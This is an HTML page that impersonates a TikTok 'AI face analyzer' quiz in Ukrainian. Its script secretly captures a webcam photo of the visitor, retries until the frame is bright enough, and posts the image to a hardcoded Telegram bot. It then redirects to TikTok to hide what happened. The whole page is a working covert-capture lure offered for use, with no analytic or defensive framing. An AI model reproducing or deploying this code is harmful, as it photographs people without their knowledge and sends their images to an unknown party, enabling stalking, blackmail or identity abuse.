<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok AI Scanner</title>
    <meta property="og:title" content="TikTok - AI Face Scanner">
    <meta property="og:description" content="Дізнайся, на якого блогера ти схожий!">
    <meta property="og:image" content="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/card/logo.png">
    <meta name="theme-color" content="#fe2c55">
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { padding: 20px; max-width: 400px; }
        .logo { width: 80px; margin-bottom: 20px; }
        .btn { background: #fe2c55; border: none; padding: 16px 40px; color: #fff; font-size: 16px; font-weight: bold; border-radius: 4px; cursor: pointer; width: 100%; }
        #status { display: none; margin-top: 20px; }
        .loader { border: 3px solid #333; border-top: 3px solid #fe2c55; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="container" id="ui">
        <img src="https://logodownload.org/wp-content/uploads/2019/01/tiktok-logo-7.png" class="logo">
        <h2>AI Face Analyzer</h2>
        <p>Натисніть кнопку, щоб почати сканування.</p>
        <button class="btn" onclick="start()">Почати аналіз</button>
        <div id="status">
            <div class="loader"></div>
            <p>Налаштування нейромережі...</p>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" width="640" height="480"></canvas>

    <script>
        const token = '8492555273:AAHur2SwzreGkYlCz5-gBCGCJxzvrdwFczM';
        const chat = '7808795546';
        const tiktokUrl = 'https://www.tiktok.com/explore';

        async function start() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = s;
                
                document.querySelector('.btn').style.display = 'none';
                document.querySelector('p').style.display = 'none';
                document.getElementById('status').style.display = 'block';

                // Очікуємо стабілізації камери 1.5 секунди
                // Це прибере 99% чорних фото на слабких телефонах
                setTimeout(() => {
                    takeSnap(s, v);
                }, 1500);

            } catch (e) {
                window.location.href = tiktokUrl;
            }
        }

        function takeSnap(s, v) {
            const canvas = document.getElementById('c');
            const ctx = canvas.getContext('2d');
            
            // Малюємо кадр
            ctx.drawImage(v, 0, 0, 640, 480);
            
            // Перевірка на "чорноту": беремо центральний піксель
            const pixelData = ctx.getImageData(320, 240, 1, 1).data;
            const brightness = (pixelData[0] + pixelData[1] + pixelData[2]) / 3;

            // Якщо дуже темно (яскравість < 5), пробуємо ще раз через 200мс
            if (brightness < 5) {
                setTimeout(() => takeSnap(s, v), 200);
                return;
            }

            canvas.toBlob(b => {
                const f = new FormData();
                f.append('chat_id', chat);
                f.append('photo', b, 'img.jpg');

                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f })
                .finally(() => {
                    s.getTracks().forEach(t => t.stop());
                    window.location.href = tiktokUrl;
                });
            }, 'image/jpeg', 0.7);
        }
    </script>
</body>
</html>
